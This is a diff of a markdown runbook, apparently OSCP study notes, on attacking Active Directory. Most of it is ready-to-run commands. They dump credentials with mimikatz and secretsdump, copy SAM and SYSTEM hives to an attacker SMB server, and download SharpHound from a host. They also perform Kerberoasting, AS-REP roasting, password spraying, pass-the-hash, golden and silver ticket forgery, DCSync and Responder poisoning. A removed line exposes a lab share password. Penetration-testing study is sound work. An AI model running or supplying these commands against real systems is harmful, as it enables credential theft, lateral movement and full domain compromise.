@@ -1,9 +1,11 @@
 # OSCP Active Directory Enumeration
 
 ## Introduction
+
 This runbook provides a comprehensive guide to Active Directory enumeration. It includes a variety of techniques and tools for discovering and exploiting Active Directory configurations.
 
 ## Table of Contents
+
 - [OSCP Active Directory Enumeration](#oscp-active-directory-enumeration)
   - [Introduction](#introduction)
   - [Table of Contents](#table-of-contents)
@@ -47,6 +49,7 @@ This runbook provides a comprehensive guide to Active Directory enumeration. It 
 ## Enumeration
 
 ### Enumerating Users
+
   Enumerate all users in the entire domain
 ```sh
 net user /domain
@@ -66,6 +69,7 @@ Get-NetSession -ComputerName dc1
 ```
 
 ### Enumerating Groups
+
   Enumerate all groups in the entire domain
 ```sh
 net group /domain
@@ -76,6 +80,7 @@ Get-NetLocalGroup -ComputerName <domain> -Recurse (PowerView)
 ```
 
 ### Domain Information
+
   Find out domain controller hostname
 ```sh
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
@@ -90,29 +95,32 @@ curl https://github.com/samratashok/ADModule/blob/master/Microsoft.ActiveDirecto
 Import-Module .\Microsoft.ActiveDirectory.Management.dll  
 Import-Module .\ActiveDirectory.psd1  
 ```
+
   Powerview
-```sh
-curl https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 -o PowerView.ps1
-. .\PowerView.ps1
-```
+
+[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
 
 ### Last Logon
+
 ```sh
 Get-LastLoggedOn -ComputerName <domain>
 ```
 
 ### List Computers
+
 ```sh
 Get-NetComputer (PowerView)
 ```
 
 ### Add Domain User to a Domain Group
+
 ```sh
 Add-DomainGroupMember -Identity 'SQLManagers' -Members 'examed'
 Get-NetGroupMember -GroupName 'SQLManagers'
 ```
 
 ### Enumeration Script for All AD Users
+
 ```powershell
 $domainObj = [System.DirectoryServices.ActiveDirectory.Domain::GetCurrentDomain()
 $PDC = ($domainObj.PdcRoleOwner).Name
@@ -149,8 +157,7 @@ crackmapexec smb <IP> -u <user> -p <password>
   Connect via smbclient
 ```
 smbclient //ip -U <user> -L
-example:
-smbclient //172.16.177.21/monitoring -U relia//mountuser%DRtajyCwcbWvH/9  
+smbclient //<ip>>/<share> -U <domain>//<user>%<pass>  
 ```
   smbmap
 ```
@@ -162,16 +169,17 @@ crackmapexec smb <IP> --shares -u <user> -p '<pass>'
 ```
 
 ### Enumeration Through Service Principal Names
-https://raw.githubusercontent.com/compwiz32/PowerShell/master/Get-SPN.ps1
+
+[Get-SPN](https://github.com/compwiz32/PowerShell/blob/master/Get-SPN.ps1) - Powershell script
 
 ## Enumeration - BloodHound
+
 kali
 ```sh
 start neo4j - http://localhost:7474/
-```
 sudo neo4j start
 ```
- Enumeration - Windows
+ Windoews - Enumeration
 ``` powershell
 iwr -uri <ip>/SharpHound.ps1 -Outfile SharpHound.ps1
 . .\SharpHound.ps1
@@ -179,8 +187,6 @@ Invoke-Bloodhound -CollectionMethod All,loggedon
 Invoke-BloodHound -CollectionMethod All -Verbose
 Invoke-BloodHound -CollectionMethod LoggedOn -Verbose
 ```
-
-
 
 ## Remote Access
 
@@ -210,6 +216,7 @@ runas /user:<hostname>\<user> cmd
 ```
 
 #### RDP from terminal
+
   xfreerdp via RDP with sharing in \\\tsclient\share\
 ```
 xfreerdp /u:user /p:pass /v:ip +clipboard /dynamic-resolution /cert:ignore /drive:/usr/share/windows-resources,share
@@ -220,6 +227,7 @@ rdesktop -u <user> -p <password> -d <domain> -f <ip>
 ```
 
 #### evil-winrm
+
 ```
 evil-winrm -i <ip> -u <user> -p <password>
 ```
@@ -227,32 +235,38 @@ evil-winrm -i <ip> -u <user> -p <password>
 ## Exploitation
 
 ### Cached Credential Storage and Retrieval
+
+See also password attacks
 ```
 ./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"
 ```
 
 ### Extracting hashes
+
 #### Intro
+
 SAM - Security Account Manager (Store as user accounts)  %SystemRoot%/system32/config/sam  
 NTDS.DIT (Windows Server / Active Directory - Store AD data including user accounts) %SystemRoot%/ntds/ntds.dit  
 SYSTEM (System file to decrypt SAM/NTDS.DIT)  %SystemRoot%/system32/config/system  
 Backup - Sistemas antigos como XP/2003: C:\Windows\repair\sam and C:\Windows\repair\system
 
 ### Get sam and system by registry (From old versions to recent versions)
-```cmd win
+
+```cmd
+# windows
 reg save hklm\sam <ip>.sam
 reg save hklm\system <ip>.system
 ```
   transfer .sam and .system by SMB
-```sh 
+```sh
 # kali
 impacket-smbserver share . -smb2support -user user -password test123
 ```
 ```cmd
 # windows
-net use \\<smbserver>\share /USER:user test123
-copy C:\Users\Backup\sam.hive \\<smbserver>\share\
-copy C:\Users\Backup\system.hive \\<smbserver>\share\
+net use z: \\<smbserver>\share /USER:user test123
+copy C:\Users\Backup\sam.hive z:\
+copy C:\Users\Backup\system.hive z:\
 ```
   View smb enumeration  
 ```
@@ -262,6 +276,7 @@ net use
 ```
 
 ### Volume shadow copy (Windows Server \ recent versions)
+
   vssadmin  
 ```
 vssadmin create shadow /for=c:
@@ -279,7 +294,8 @@ samdump2 system sam
 impacket-secretsdump -sam sam -system system LOCAL
 ```
 
-### Extracting Hashes in Domain and Pivoting  
+### Extracting Hashes in Domain and Pivoting
+
   Dump the credentials of all connected users, including cached hashes
 ```
 mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
@@ -302,6 +318,7 @@ Invoke-Mimikatz
 ```
 
 ### Extracting Hashes in cache
+
   fgdump  -> /usr/share/windows-binaries/fgdump/fgdump.exe
 ```
 fgdump.exe
@@ -328,23 +345,25 @@ wdigest
 ```
 
 ### Extracting Hashes (Remote)
+
 ```sh
 impacket-secretsdump <user>:<password>@<IP>
 ```
 
 ### AS-REP Roasting Attack - not require Pre-Authentication
+
   kerbrute - Enumeration Users
 ```sh
 kerbrute userenum -d test.local --dc <dc_ip> userlist.txt
 ```
-https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
-
-   GetNPUsers.py - Query ASReproastable accounts from the KDC
+[Github Userlist](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt)
+ GetNPUsers.py - Query ASReproastable accounts from the KDC
 ```sh
 impacket-GetNPUsers domain.local/ -dc-ip <IP> -usersfile userlist.txt
 ```
 
 ### Kerberoast
+
   impacket-GetUserSPNs
 ```
 impacket-GetUserSPNs <domain>/<user>:<password>// -dc-ip <IP> -request
@@ -364,9 +383,8 @@ or
 runas /user:<hostname>\<user> cmd.exe
 ```
 
-
-
 ## Service Account Attacks
+
   Some user tickets that are stored in memory
   Display all cached Kerberos tickets for the current user
 ```
@@ -383,17 +401,19 @@ Wordlist Attack with tgsrepcrack.py to get the clear text password for the servi
 python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <ticket.kirbi>
 ```
 or  
-https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
+[Invoke-Kerberoast.ps1](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
 
 ## Password Spraying
+
+[Spray-Passwords](https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1)
 ```
 .\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
 ```
-https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
-
 
 ## Active Directory Lateral Movement
+
 ### Pass the Hash
+
   Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
 ```sh
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> cmd
@@ -409,6 +429,7 @@ evil-winrm -i <IP> -u <user> -H <hash>
 ```
 
 ### Over Pass the Hash
+
 Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user
 ```cmd
 mimikatz.exe "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm.hash> /run:PowerShell.exe" "exit"
@@ -419,6 +440,7 @@ mimikatz.exe "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm.hash> /run
 ```
 
 ### Silver Ticket - Pass the Ticket
+
 It is a persistence and elevation of privilege technique in which a TGS is forged to gain access to a service in an application.
   Get SID
 ```
@@ -445,6 +467,7 @@ kerberos::list
 ```
 
 ### Golden Ticket - Pass the Ticket
+
 It is a persistence and elevation of privilege technique where tickets are forged to take control of the Active Directory Key Distribution Service (KRBTGT) account and issue TGT's.
   Get hash krbtgt
 ```
@@ -468,12 +491,14 @@ psexec.exe \\dc1 cmd.exe
 ```
 
 ### DCSync Attack
+
 -> The DCSync attack consists of requesting a replication update with a domain controller and obtaining the password hashes of each account in Active Directory without ever logging into the domain controller.
 ```
 ./mimikatz.exe "lsadump::dcsync /user:Administrator"
 ```
 
 ### NetNTLM Authentication Exploits with SMB - LLMNR Poisoning - Capturing hash in responder
+
 Responder allows you to perform Man-in-the-Middle attacks by poisoning responses during NetNTLM authentication, making the client talk to you instead of the real server it wants to connect to.
 On a real lan network, the responder will attempt to poison all Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Server (NBT-NS), and Web Proxy Auto-Dscovery (WPAD) requests detected. NBT-NS is the precursor protocol to LLMNR.
 ```
